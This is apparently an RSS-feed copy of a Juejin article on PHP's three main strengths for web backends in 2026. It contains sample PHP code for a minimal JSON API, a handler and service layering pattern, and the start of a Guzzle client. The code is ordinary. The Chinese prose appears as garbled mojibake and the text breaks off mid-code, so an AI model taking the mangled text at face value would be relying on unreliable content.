<p>å»ºè®®æ‰€æœ‰è¿½æ±‚æ€§èƒ½å’Œå¼€å‘ä½“éªŒçš„å¼€å‘è€…å°½å¿«å‡çº§åˆ°Python3.12å¹¶åº”ç”¨è¿™äº›æ–°ç‰¹æ€§</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026 å¹´ PHP çš„ä¸‰å¤§ä¼˜åŠ¿ è¿™é—¨"è€å°†"ä¸ºä½•ä¾ç„¶é‡è¦]]></title>    <link>https://juejin.cn/post/7592483877986566150</link>    <guid>https://juejin.cn/post/7592483877986566150</guid>    <pubDate>2026-01-08T00:15:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592483877986566150" data-draft-id="7592452108797788203" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026 å¹´ PHP çš„ä¸‰å¤§ä¼˜åŠ¿ è¿™é—¨&quot;è€å°†&quot;ä¸ºä½•ä¾ç„¶é‡è¦"/> <meta itemprop="keywords" content="åç«¯,PHP"/> <meta itemprop="datePublished" content="2026-01-08T00:15:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026 å¹´ PHP çš„ä¸‰å¤§ä¼˜åŠ¿ è¿™é—¨"è€å°†"ä¸ºä½•ä¾ç„¶é‡è¦
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T00:15:39.000Z" title="Thu Jan 08 2026 00:15:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">2026 å¹´ PHP çš„ä¸‰å¤§ä¼˜åŠ¿ è¿™é—¨"è€å°†"ä¸ºä½•ä¾ç„¶é‡è¦</h2>
<p>PHP "å¿«æ­»äº†"è¿™å¥è¯å–Šäº†è¿™ä¹ˆå¤šå¹´ï¼Œå¦‚æœçœŸæœ‰æ¥ä¸–ï¼Œå®ƒçš„ç®€å†åº”è¯¥å·²ç»ç›¸å½“å¯è§‚äº†ã€‚</p>
<p>ä½ å¤§æ¦‚è§è¿‡è¿™äº›è®ºè°ƒï¼š"PHP è¿‡æ—¶äº†"ã€"ç°åœ¨æ²¡äººç”¨ PHP åšæ­£ç»ç³»ç»Ÿäº†"ã€"åªæœ‰è€é¡¹ç›®è¿˜åœ¨ç”¨"ã€‚è¿™äº›è¯´æ³•ä¹Ÿä¸ç®—å…¨é”™â€”â€”ç¡®å®æœ‰å¤§é‡é—ç•™ PHP ä»£ç åœ¨è¿è¡Œã€‚ä½†è¿˜æœ‰å¦ä¸€ä¸ªç°å®å¾ˆå°‘è¢«æåŠï¼šPHP ä»ç„¶åœ¨é©±åŠ¨å¤§é‡ç”Ÿäº§ç¯å¢ƒçš„åç«¯ç³»ç»Ÿï¼Œæ–°çš„ PHP é¡¹ç›®ä¹Ÿåœ¨ä¸æ–­å‡ºç°ï¼Œå› ä¸ºå›¢é˜Ÿæƒ³è¦çš„ä¸œè¥¿å’Œäº”å¹´ã€åå¹´å‰ä¸€æ ·ï¼š</p>
<ul>
<li>å¯é¢„æµ‹çš„éƒ¨ç½²æµç¨‹</li>
<li>å¿«é€Ÿè¿­ä»£</li>
<li>æˆç†Ÿçš„ç”Ÿæ€</li>
<li>èƒ½å¤Ÿç»å—å¤šäººåä½œã€å¤šå¹´ç»´æŠ¤çš„å¯è¯»ä»£ç </li>
</ul>
<p>æˆ‘å–œæ¬¢è¿™ç±»é—®é¢˜ï¼Œå› ä¸ºå®ƒé€¼ä½ æŠŠè¯è¯´æ¸…æ¥šã€‚ä¸æ˜¯"æˆ‘å–œæ¬¢ç”¨"ï¼Œä¸æ˜¯"å®ƒå¾ˆæµè¡Œ"ï¼Œè€Œæ˜¯ä½ åœ¨ç”Ÿäº§ä»£ç ä¸­èƒ½å®é™…æŒ‡å‡ºçš„å·¥ç¨‹ä¼˜åŠ¿ã€‚</p>
<p>ä¸‹é¢æ˜¯æˆ‘çš„å›ç­”ï¼Œå†™ç»™ä¸¤ç±»è¯»è€…ï¼š</p>
<ul>
<li><strong>å¦‚æœä½ åˆšæ¥è§¦åç«¯å¼€å‘</strong>ï¼šä½ ä¼šå¾—åˆ°ä¸€ä¸ªæ¸…æ™°çš„å¿ƒæ™ºæ¨¡å‹ï¼Œç†è§£ PHP ä¸ºä½•ä»ç„¶é€‚åˆ Web ç³»ç»Ÿã€‚</li>
<li><strong>å¦‚æœä½ ç»éªŒä¸°å¯Œ</strong>ï¼šä½ ä¼šçœ‹åˆ°ç°ä»£ PHP å®è·µï¼ˆç±»å‹ã€é™æ€åˆ†æã€æ¸…æ™°è¾¹ç•Œã€åŠ¡å®çš„ API æ¨¡å¼ï¼‰å¦‚ä½•æŠŠ"PHP å®¹æ˜“ä¸Šæ‰‹"å˜æˆ"PHP å¯é "ã€‚</li>
</ul>
<p>æˆ‘ä¼šå°½é‡ç”¨å¹³å®çš„è¯­è¨€ï¼Œä½†ä¸ä¼šå›é¿æŠ€æœ¯ç»†èŠ‚ã€‚çœŸå®çš„ç³»ç»Ÿæœ¬æ¥å°±æ˜¯æŠ€æœ¯æ€§çš„ã€‚ç›®æ ‡æ˜¯è®©è¿™äº›æŠ€æœ¯å†…å®¹å˜å¾—æ˜“æ‡‚ä¸”å®ç”¨ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2026-01%2Fphp-3-biggest-strengths-2026" target="_blank" title="https://catchadmin.com/post/2026-01/php-3-biggest-strengths-2026" ref="nofollow noopener noreferrer">åŸæ–‡ 2026 å¹´ PHP çš„ä¸‰å¤§ä¼˜åŠ¿ è¿™é—¨"è€å°†"ä¸ºä½•ä¾ç„¶é‡è¦</a></p>
<h3 data-id="heading-1">ä»€ä¹ˆæ˜¯"ä¼˜åŠ¿"ï¼šåœ¨çœŸå®åç«¯å·¥ä½œä¸­çš„å®šä¹‰</h3>
<p>å¼€å‘è€…æ¯”è¾ƒè¯­è¨€æ—¶ï¼Œè®¨è®ºç»å¸¸è·‘ååˆ°æ€§èƒ½åŸºå‡†ã€è¯­æ³•åå¥½æˆ–è€…äº’è”ç½‘æ–‡åŒ–ã€‚ä½†å½“ä½ åœ¨æ„å»º API æˆ– Web åç«¯æ—¶ï¼Œ"ä¼˜åŠ¿"é€šå¸¸æ„å‘³ç€ä¸€äº›æ›´æ— èŠâ€”â€”ä¹Ÿæ›´é‡è¦çš„ä¸œè¥¿ï¼š</p>
<ul>
<li>èƒ½å¦å¿«é€Ÿäº¤ä»˜åŠŸèƒ½è€Œä¸åŸ‹ä¸‹ç»´æŠ¤é™·é˜±ï¼Ÿ</li>
<li>èƒ½å¦é›†æˆæ•°æ®åº“ã€é˜Ÿåˆ—å’Œç¬¬ä¸‰æ–¹ API è€Œä¸ä»å¤´é€ è½®å­ï¼Ÿ</li>
<li>èƒ½å¦å¤„ç†æ··ä¹±çš„æ•°æ®å’Œè¾¹ç¼˜æƒ…å†µè€Œä¸æŠŠä»£ç å˜æˆé¬¼å±‹ï¼Ÿ</li>
</ul>
<p>è¿™å°±æ˜¯ PHP æœ€æ“…é•¿çš„é¢†åŸŸã€‚ä¸æ˜¯å› ä¸ºå®ƒæœ€ä¼˜é›…ï¼Œè€Œæ˜¯å› ä¸ºå®ƒçš„å½¢çŠ¶åˆšå¥½å¥‘åˆå¤§å¤šæ•° Web åç«¯ã€‚</p>
<p>å¸¦ç€è¿™ä¸ªæ€è·¯ï¼Œæ¥çœ‹ PHP åœ¨ 2026 å¹´çš„ä¸‰å¤§ä¼˜åŠ¿ã€‚</p>
<h3 data-id="heading-2">ä¼˜åŠ¿ä¸€ï¼šWeb åŸç”Ÿçš„ç”Ÿäº§åŠ›ï¼ˆPHP å¤©ç„¶å¥‘åˆ HTTP ä¸–ç•Œï¼‰</h3>
<p>å¤§å¤šæ•°åç«¯éƒ½æ˜¯ HTTP æœºå™¨ã€‚è¿™ä¸æ˜¯æ¯”å–»ï¼Œè€Œæ˜¯æ—¥å¸¸å·¥ä½œï¼š</p>
<ul>
<li>è¯·æ±‚è¿›æ¥</li>
<li>æ ¡éªŒå¹¶è§„èŒƒåŒ–</li>
<li>è°ƒç”¨æœåŠ¡ / æ•°æ®åº“ / å¤–éƒ¨ API</li>
<li>è¿”å› JSON</li>
<li>è®°å½•æ—¥å¿—å’Œè¿½è¸ª</li>
<li>å¾ªç¯</li>
</ul>
<p>PHP çš„ç¬¬ä¸€ä¸ªä¼˜åŠ¿æ˜¯å®ƒåœ¨è¿™ä¸ªå¾ªç¯é‡Œæ„Ÿè§‰å¾ˆè‡ªç„¶ã€‚ä½ ä¸éœ€è¦åœ¨å¤„ç†è¯·æ±‚ä¹‹å‰"æ­å»ºä¸–ç•Œ"ã€‚PHP çš„é»˜è®¤æ¨¡å‹å°±æ˜¯é¢å‘ Web çš„ï¼Œè¿™ä¸€ç‚¹å¾€å¾€è¢«ä½ä¼°äº†ã€‚</p>
<h4 data-id="heading-3">ç»å…¸çš„ PHP æ‰§è¡Œæ¨¡å‹ä¸ºä½•ä»ç„¶æœ‰ç”¨</h4>
<p>PHP ä¼ ç»Ÿçš„è¯·æ±‚ç”Ÿå‘½å‘¨æœŸå¾ˆç®€å•ï¼š</p>
<ol>
<li>å¼€å§‹è¯·æ±‚</li>
<li>è¿è¡Œä»£ç </li>
<li>è¿”å›å“åº”</li>
<li>ç»“æŸè¯·æ±‚</li>
</ol>
<p>ç„¶åä¸‹ä¸€ä¸ªè¯·æ±‚ä»å¤´å¼€å§‹ã€‚</p>
<p>æœ‰äººæŠŠè¿™å½“æˆç›¸å¯¹äºé•¿é©»æœåŠ¡å™¨çš„åŠ£åŠ¿ï¼Œä½†åœ¨å®è·µä¸­å®ƒå¾€å¾€æ˜¯ä¼˜åŠ¿ï¼š</p>
<ul>
<li>å†…å­˜æ³„æ¼ä¸ä¼šé‚£ä¹ˆè‡´å‘½ï¼Œå› ä¸ºè¿›ç¨‹ä¼šå›æ”¶ã€‚</li>
<li>æ¯ä¸ªè¯·æ±‚å¤©ç„¶éš”ç¦»ã€‚</li>
<li>ä¸å¤ªå¯èƒ½æ„å¤–ä¾èµ–å†…å­˜çŠ¶æ€ã€‚</li>
<li>è°ƒè¯•å¾€å¾€æ›´ç®€å•ï¼Œå› ä¸ºæ¯ä¸ªè¯·æ±‚æœ‰æ¸…æ™°çš„è¾¹ç•Œã€‚</li>
</ul>
<p>ä½ ä¹Ÿå¯ä»¥ç”¨é•¿é©»æ¨¡å¼è·‘ PHPï¼ˆRoadRunnerã€Swoole ç­‰ï¼‰ï¼Œå®ƒä»¬åœ¨ç‰¹å®šåœºæ™¯ä¸‹ç¡®å®å¾ˆå¥½ã€‚ä½†ç»å…¸æ¨¡å‹å¯¹è®¸å¤š API ä»ç„¶æ˜¯å¯é çš„é»˜è®¤é€‰æ‹©ï¼Œå› ä¸ºå®ƒç¨³å®šä¸”å¯¹è¿ç»´å‹å¥½ã€‚</p>
<h4 data-id="heading-4">ä¸€ä¸ª"çº¯ PHP"çš„ API å…¥å£ï¼ˆå±•ç¤ºåŸºæœ¬å½¢æ€ï¼‰</h4>
<p>å³ä½¿ä½ åœ¨ç”Ÿäº§ç¯å¢ƒä½¿ç”¨ Laravel æˆ– Symfonyï¼ˆå¤§å¤šæ•°æ­£ç»åº”ç”¨ç¡®å®è¯¥ç”¨ï¼‰ï¼Œçœ‹çœ‹ PHP ä¸ºä½•åœ¨ Web å·¥ä½œä¸­é«˜æ•ˆè¿˜æ˜¯æœ‰å¸®åŠ©çš„ã€‚</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);
<span class="hljs-keyword">require</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">'/../vendor/autoload.php'</span>;
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Content-Type: application/json; charset=utf-8'</span>);
<span class="hljs-variable">$method</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REQUEST_METHOD'</span>] ?? <span class="hljs-string">'GET'</span>;
<span class="hljs-variable">$path</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REQUEST_URI'</span>] ?? <span class="hljs-string">'/'</span>, PHP_URL_PATH) ?: <span class="hljs-string">'/'</span>;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jsonResponse</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$payload</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$status</span> = <span class="hljs-number">200</span></span>): <span class="hljs-title">void</span> </span>{
    <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-variable">$status</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$payload</span>, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    <span class="hljs-keyword">exit</span>;
}
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readJsonBody</span>(<span class="hljs-params"/>): <span class="hljs-title">array</span> </span>{
    <span class="hljs-variable">$raw</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'php://input'</span>) ?: <span class="hljs-string">''</span>;
    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$raw</span>, <span class="hljs-literal">true</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>) ? <span class="hljs-variable">$data</span> : [];
}
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$method</span> === <span class="hljs-string">'GET'</span> &amp;&amp; <span class="hljs-variable">$path</span> === <span class="hljs-string">'/health'</span>) {
    <span class="hljs-title function_ invoke__">jsonResponse</span>([<span class="hljs-string">'ok'</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">'time'</span> =&gt; <span class="hljs-title function_ invoke__">date</span>(DATE_ATOM)]);
}
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$method</span> === <span class="hljs-string">'POST'</span> &amp;&amp; <span class="hljs-variable">$path</span> === <span class="hljs-string">'/users'</span>) {
    <span class="hljs-variable">$body</span> = <span class="hljs-title function_ invoke__">readJsonBody</span>();
    <span class="hljs-variable">$email</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">trim</span>((<span class="hljs-keyword">string</span>)(<span class="hljs-variable">$body</span>[<span class="hljs-string">'email'</span>] ?? <span class="hljs-string">''</span>)));
    <span class="hljs-variable">$name</span>  = <span class="hljs-title function_ invoke__">trim</span>((<span class="hljs-keyword">string</span>)(<span class="hljs-variable">$body</span>[<span class="hljs-string">'name'</span>] ?? <span class="hljs-string">''</span>));
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$email</span>, FILTER_VALIDATE_EMAIL)) {
        <span class="hljs-title function_ invoke__">jsonResponse</span>([<span class="hljs-string">'error'</span> =&gt; <span class="hljs-string">'Invalid email'</span>], <span class="hljs-number">422</span>);
    }
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$name</span> === <span class="hljs-string">''</span>) {
        <span class="hljs-title function_ invoke__">jsonResponse</span>([<span class="hljs-string">'error'</span> =&gt; <span class="hljs-string">'Name is required'</span>], <span class="hljs-number">422</span>);
    }
    <span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">random_int</span>(<span class="hljs-number">1000</span>, <span class="hljs-number">9999</span>);
    <span class="hljs-title function_ invoke__">jsonResponse</span>([<span class="hljs-string">'id'</span> =&gt; <span class="hljs-variable">$id</span>, <span class="hljs-string">'email'</span> =&gt; <span class="hljs-variable">$email</span>, <span class="hljs-string">'name'</span> =&gt; <span class="hljs-variable">$name</span>], <span class="hljs-number">201</span>);
}
<span class="hljs-title function_ invoke__">jsonResponse</span>([<span class="hljs-string">'error'</span> =&gt; <span class="hljs-string">'Not found'</span>], <span class="hljs-number">404</span>);
</code></pre>
<p>è¿™ä¸æ˜¯"æœ€ä½³å®è·µæ¶æ„"ï¼Œä½†å®ƒæ¼”ç¤ºäº†æ ¸å¿ƒæ€æƒ³ï¼šPHP çš„ Web å¾ªç¯ç›´æ¥ä¸”æ˜“æ‡‚ã€‚è¿™å°±æ˜¯åŸºç¡€çš„ç”Ÿäº§åŠ›ä¼˜åŠ¿ã€‚</p>
<h4 data-id="heading-5">"å¿«"ä¸"ä¹±"çš„åŒºåˆ«ï¼šè–„ handlerï¼ŒçœŸæœåŠ¡</h4>
<p>PHP çš„ Web ç”Ÿäº§åŠ›è¦æˆä¸ºé•¿æœŸä¼˜åŠ¿ï¼Œå‰ææ˜¯ä¿æŒè¾¹ç•Œæ¸…æ™°ã€‚æœ€å®¹æ˜“å¤±å»è¿™ä¸ªä¼˜åŠ¿çš„æ–¹å¼å°±æ˜¯æŠŠæ‰€æœ‰ä¸œè¥¿éƒ½å¡è¿›æ§åˆ¶å™¨ã€‚</p>
<p>ä¸€ä¸ªå¯æ‰©å±•çš„æ¨¡å¼ï¼š</p>
<ul>
<li><strong>Handler / æ§åˆ¶å™¨</strong>ï¼šè§£ç è¯·æ±‚ã€è°ƒç”¨æœåŠ¡ã€ç¼–ç å“åº”</li>
<li><strong>æœåŠ¡</strong>ï¼šä¸šåŠ¡é€»è¾‘ + ç¼–æ’</li>
<li><strong>Repository / Client</strong>ï¼šå­˜å‚¨ + å¤–éƒ¨ API è°ƒç”¨</li>
</ul>
<p>è¿™æ˜¯ä¸€ä¸ªä¸æ¡†æ¶æ— å…³çš„å°ä¾‹å­ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CreateUserHandler</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> UserService <span class="hljs-variable">$service</span>
    </span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$body</span></span>): <span class="hljs-title">array</span>
    </span>{
        <span class="hljs-variable">$input</span> = <span class="hljs-title class_">CreateUserInput</span>::<span class="hljs-title function_ invoke__">fromArray</span>(<span class="hljs-variable">$body</span>);
        <span class="hljs-variable">$user</span>  = <span class="hljs-variable language_">$this</span>-&gt;service-&gt;<span class="hljs-title function_ invoke__">create</span>(<span class="hljs-variable">$input</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">UserResource</span>::<span class="hljs-title function_ invoke__">toArray</span>(<span class="hljs-variable">$user</span>);
    }
}
</code></pre>
<p>Handler è¯»èµ·æ¥åƒä¸€æ®µå™è¿°ã€‚è¿™å°±å¯¹äº†ã€‚</p>
<p>ç°åœ¨æœåŠ¡æ¥åšçœŸæ­£çš„å†³ç­–ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserService</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> UserRepository <span class="hljs-variable">$users</span>
    </span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create</span>(<span class="hljs-params">CreateUserInput <span class="hljs-variable">$input</span></span>): <span class="hljs-title">User</span>
    </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;users-&gt;<span class="hljs-title function_ invoke__">existsByEmail</span>(<span class="hljs-variable">$input</span>-&gt;email)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">DomainException</span>(<span class="hljs-string">'Email already registered'</span>);
        }
        <span class="hljs-variable">$user</span> = <span class="hljs-title class_">User</span>::<span class="hljs-title function_ invoke__">register</span>(<span class="hljs-variable">$input</span>-&gt;email, <span class="hljs-variable">$input</span>-&gt;name);
        <span class="hljs-variable language_">$this</span>-&gt;users-&gt;<span class="hljs-title function_ invoke__">save</span>(<span class="hljs-variable">$user</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$user</span>;
    }
}
</code></pre>
<p>è¿™ä¸ªç»“æ„å¹¶ä¸èŠ±å“¨ï¼Œä½†å®ƒèƒ½é˜²æ­¢ä»£ç åº“åœ¨å…­ä¸ªæœˆå†…å˜æˆæ„å¤§åˆ©é¢ã€‚</p>
<h4 data-id="heading-6">çœŸå®ä¸–ç•Œçš„ API å·¥ä½œï¼šè¶…æ—¶å’Œé‡è¯•æ˜¯åŠŸèƒ½çš„ä¸€éƒ¨åˆ†</h4>
<p>PHP ä¿æŒå®ç”¨çš„ä¸€ä¸ªåŸå› æ˜¯ï¼Œåš PHP åç«¯çš„å›¢é˜Ÿå¾€å¾€å¾ˆæ—©å°±è¢«è¿«é¢å¯¹ Web çš„ç°å®ã€‚ä¸æ˜¯å› ä¸º PHP ç‰¹æ®Šï¼Œè€Œæ˜¯å› ä¸º Web æœ¬èº«å°±ä¸å®½å®¹ã€‚</p>
<p>å¦‚æœä½ è°ƒç”¨å¤–éƒ¨ API å´ä¸è®¾è¶…æ—¶ã€ä¸è®¾é‡è¯•ç­–ç•¥ï¼Œä½ å°±æ˜¯åœ¨åŸ‹ä¸‹æœªæ¥çš„äº‹æ•…ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªç”¨ Guzzle å†™çš„å°è£…ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­èƒ½æ­£ç»å¹²æ´»ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">use</span> <span class="hljs-title">GuzzleHttp</span>\<span class="hljs-title">Client</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">GuzzleHttp</span>\<span class="hljs-title">Exception</span>\<span class="hljs-title">GuzzleException</span>;
<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShippingClient</span>
</span>{
    <span class="hljs-keyword">private</span> Client <span class="hljs-variable">$http</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$baseUrl</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$token</span></span>)
    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;http = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>([
            <span class="hljs-string">'base_uri'</span> =&gt; <span class="hljs-title function_ invoke__">rtrim</span>(<span class="hljs-variable">$baseUrl</span>, <span class="hljs-string">'/'</span>) . <span class="hljs-string">'/'</span>,
            <span class="hljs-string">'timeout'</span> =&gt; <span class="hljs-number">3.0</span>,
